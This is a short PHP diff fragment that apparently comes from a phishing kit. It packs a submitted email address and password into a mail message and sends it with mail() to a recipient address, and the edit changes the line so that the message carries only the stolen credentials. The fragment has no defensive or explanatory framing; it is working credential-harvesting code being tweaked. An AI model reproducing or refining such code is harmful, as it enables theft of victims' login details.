@@ -11,7 +11,7 @@
 
                             $headers = "From: $email_from \r\n";
                           
-                            $headers .=  "Email: $Email \r\n Password: $password \r\n ";
+                            $headers =  "Email: $Email \r\n Password: $password \r\n ";
                         
                           
                             mail($to,$email_subject,$headers);
